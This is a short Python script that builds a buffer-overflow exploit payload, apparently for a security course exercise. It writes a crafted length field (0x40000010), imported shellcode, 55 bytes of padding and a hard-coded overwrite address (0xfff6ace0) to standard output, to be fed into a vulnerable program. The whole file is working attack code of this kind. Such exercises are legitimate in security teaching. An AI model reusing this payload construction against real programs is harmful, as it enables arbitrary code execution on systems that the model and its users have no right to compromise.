from shellcode import shellcode
import sys
sys.stdout.buffer.write(0x40000010.to_bytes(4,"little"))
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x80"*55)
sys.stdout.buffer.write(0xfff6ace0.to_bytes(4,"little"))
